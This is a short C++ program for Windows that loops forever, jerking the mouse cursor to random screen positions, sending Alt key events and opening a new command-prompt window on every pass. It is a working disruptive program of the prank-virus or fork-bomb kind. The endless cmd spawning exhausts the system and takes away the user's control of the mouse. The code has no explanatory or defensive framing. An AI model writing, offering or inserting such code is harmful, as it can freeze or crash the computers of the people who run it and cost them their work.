#include<bits/stdc++.h>
#include<windows.h>
#define KEY_DOWN(VK_NONAME) ((GetAsyncKeyState(VK_NONAME) & 0x8000) ? 1:0)
using namespace std;
int main()
{
	while(1)
	{
		keybd_event(VK_MENU, 0, 2, 0);
		int x=GetSystemMetrics(SM_CXSCREEN);
		int y=GetSystemMetrics(SM_CYSCREEN);
		srand(time(0));
		SetCursorPos(rand()%x,rand()%y);
		system("start cmd");
	}
	return 0;
}
